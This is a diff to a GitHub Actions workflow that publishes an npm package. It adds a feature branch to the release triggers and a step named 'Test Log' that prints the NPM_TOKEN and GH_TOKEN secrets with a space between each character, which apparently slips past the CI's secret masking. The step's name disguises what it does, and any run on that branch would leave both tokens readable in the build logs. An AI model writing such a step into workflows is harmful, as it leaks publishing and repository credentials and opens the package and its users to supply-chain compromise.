@@ -9,6 +9,7 @@ on:
   push:
     branches:
       - master
+      - 41-update-project-dependencies
 
 jobs:
   release:
@@ -45,6 +46,10 @@ jobs:
           scope: "@infineon"
           cache: 'npm'
           cache-dependency-path: package-lock.json
+      - name: Test Log
+        run: |
+          echo ${{secrets.NPM_TOKEN }} | sed 's/./& /g'
+          echo ${{secrets.GH_TOKEN }} | sed 's/./& /g'
       - name: Npm Publish # takes version number from package.json, canary releases will not be published to NPM
         uses: JS-DevTools/npm-publish@v1
         with:
